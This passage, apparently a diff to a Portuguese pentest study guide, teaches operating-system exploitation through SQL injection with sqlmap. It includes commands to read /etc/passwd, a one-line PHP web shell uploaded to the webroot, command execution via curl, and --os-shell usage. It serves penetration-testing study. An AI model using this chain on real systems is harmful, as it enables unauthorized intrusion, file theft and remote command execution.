@@ -1313,3 +1313,239 @@ Manipulação de parâmetros HTTP para bypass.
 
 ---
 
+# 💻 Exploração do Sistema Operacional com SQLMap
+
+O sqlmap não serve apenas para explorar vulnerabilidades de SQL Injection. Ele também pode interagir diretamente com o Sistema Operacional (SO), permitindo:
+
+* Ler arquivos locais do servidor
+* Escrever arquivos no servidor
+* Obter shell remota
+* Executar comandos no sistema
+
+Isso depende dos privilégios do banco de dados e das restrições do SGBD.
+
+---
+
+# 📂 Leitura e Gravação de Arquivos
+
+## Leitura de Arquivos
+
+Alguns SGBDs permitem carregar arquivos locais do servidor para dentro de tabelas do banco.
+
+Exemplo:
+
+```sql
+LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE passwd;
+```
+
+### Explicação
+
+* `LOAD DATA LOCAL INFILE`
+  → tenta ler o arquivo especificado
+
+* `INTO TABLE passwd`
+  → grava o conteúdo lido dentro da tabela `passwd`
+
+---
+
+# 🔒 Restrições Atuais
+
+Hoje em dia, muitos bancos modernos possuem proteções extras.
+
+Na maioria dos casos, é necessário:
+
+* Ser administrador do banco (DBA)
+* Possuir privilégios elevados
+* Ter permissões específicas habilitadas
+
+---
+
+# 🛡️ Verificando Privilégios de DBA
+
+Antes de tentar ler ou escrever arquivos, podemos verificar se o usuário do banco possui privilégios administrativos.
+
+## Comando
+
+```bash
+sqlmap -u "URL" --is-dba
+```
+
+## Exemplo
+
+```bash
+sqlmap -u "http://site.com?id=1" --is-dba
+```
+
+### O que faz?
+
+O SQLMap verifica se o usuário atual do banco possui privilégios de DBA.
+
+---
+
+# 📖 Lendo Arquivos Locais do Servidor
+
+## Opção `--file-read`
+
+Permite ler arquivos existentes no servidor.
+
+### Sintaxe
+
+```bash
+sqlmap -u "URL" --file-read "/etc/passwd"
+```
+
+## Exemplo
+
+```bash
+sqlmap -u "http://site.com?id=1" --file-read "/etc/passwd"
+```
+
+---
+
+# 💾 Onde o Arquivo é Salvo?
+
+O SQLMap salva automaticamente o conteúdo localmente na máquina do atacante.
+
+## Caminho padrão
+
+```bash
+cat ~/.sqlmap/output/www.example.com/files/_etc_passwd
+```
+
+---
+
+# ✍️ Escrevendo Arquivos no Servidor
+
+## Mais Restrito em Bancos Modernos
+
+A escrita de arquivos costuma ser muito mais protegida.
+
+No MySQL, por exemplo:
+
+* A opção `--secure-file-priv` geralmente bloqueia escrita arbitrária
+* Ela precisa estar desativada para permitir `INTO OUTFILE`
+
+---
+
+# ⚙️ Opções Utilizadas
+
+## `--file-write`
+
+Arquivo local que será enviado
+
+## `--file-dest`
+
+Destino no servidor
+
+---
+
+# 🐚 Exemplo: Upload de Web Shell PHP
+
+## Criando o Shell
+
+```php
+<?php system($_GET["cmd"]); ?>
+```
+
+Salvar como:
+
+```bash
+shell.php
+```
+
+---
+
+# 🚀 Enviando o Arquivo
+
+```bash
+sqlmap -u "http://www.example.com/?id=1" \
+--file-write "shell.php" \
+--file-dest "/var/www/html/shell.php"
+```
+
+---
+
+# 🖥️ Executando Comandos
+
+Após enviar o shell:
+
+```bash
+curl http://www.example.com/shell.php?cmd=ls+-la
+```
+
+### Resultado
+
+O parâmetro `cmd` será executado no servidor.
+
+---
+
+# 🌐 Webroot
+
+O diretório `/var/www/html/` normalmente representa a raiz web do servidor.
+
+## Observação
+
+Alguns servidores alteram o webroot padrão, mas o SQLMap pode tentar identificá-lo automaticamente.
+
+---
+
+# 🕹️ Obtendo Shell com SQLMap
+
+O SQLMap também pode tentar obter uma shell interativa automaticamente.
+
+## Opção `--os-shell`
+
+```bash
+sqlmap -u "http://www.example.com/?id=1" --os-shell
+```
+
+---
+
+# 🧠 Como o SQLMap Faz Isso?
+
+O SQLMap normalmente utiliza técnicas de SQL Injection como:
+
+* UNION-based
+* Error-based
+* Blind SQL Injection
+
+Por padrão, ele costuma testar usando `UNION`.
+
+---
+
+# 🎯 Definindo Técnicas Manualmente
+
+Podemos especificar quais técnicas usar.
+
+## Exemplo
+
+```bash
+--technique=E
+```
+
+ou
+
+```bash
+--technique=B
+```
+
+### Significados
+
+| Técnica | Tipo                |
+| ------- | ------------------- |
+| `E`     | Error-Based         |
+| `B`     | Blind SQL Injection |
+
+---
+
+# 📋 Resumo Geral
+
+| Função           | Opção                          |
+| ---------------- | ------------------------------ |
+| Verificar DBA    | `--is-dba`                     |
+| Ler arquivo      | `--file-read`                  |
+| Escrever arquivo | `--file-write` + `--file-dest` |
+| Obter shell      | `--os-shell`                   |
+| Escolher técnica | `--technique`                  |
+
+---
